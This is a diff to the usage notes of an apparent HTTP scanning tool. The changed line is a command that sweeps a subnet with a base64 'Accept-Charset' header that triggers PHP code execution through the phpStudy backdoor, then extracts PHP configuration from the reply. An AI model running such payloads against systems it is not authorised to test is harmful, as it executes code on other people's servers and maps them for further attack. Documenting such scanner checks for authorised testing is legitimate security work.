@@ -95,7 +95,7 @@
 
 ### phpStudy Backdoor
 ```bash
-./hb -host 192.168.1.1/24 -p 80,443,8080 -H "Accept-Charset: cGhwaW5mbygpOwo=" -H "Accept-Encoding: gzip,deflate" -regexp '<tr><td class="e">disable_functions</td><td class="v">(.*?)</td>' -redirect
+./hb -host 192.168.1.1/24 -p 80,443,8080 -H "Accept-Charset: cGhwaW5mbygpOwo=" -H "Accept-Encoding: gzip,deflate" -grep 'PHP Version' -regexp '<tr><td class="e">disable_functions</td><td class="v">(.*?)</td>' -redirect
 ```
 
 ### CVE-2019-8451 Jira SSRF
